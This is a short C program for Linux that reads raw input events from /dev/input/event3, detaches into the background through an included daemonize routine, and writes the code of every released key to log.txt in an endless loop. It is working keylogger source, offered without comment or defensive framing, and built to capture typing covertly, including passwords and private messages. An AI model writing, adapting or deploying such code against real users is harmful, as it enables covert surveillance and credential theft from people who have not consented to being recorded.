#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include "daemonize.c"
int main(int argc, char **argv)
{
    struct input_event ev;
    int keyboard = open("/dev/input/event3", O_RDONLY);
    FILE *fp = fopen("log.txt", "a");
    daemonize();
    while (1)
    {
        read(keyboard, &ev, sizeof(ev));
        if ((ev.type == EV_KEY) && (ev.value == 0))
        {
            fflush(fp);
            fprintf(fp, "%d\n", ev.code);
        }
    }
}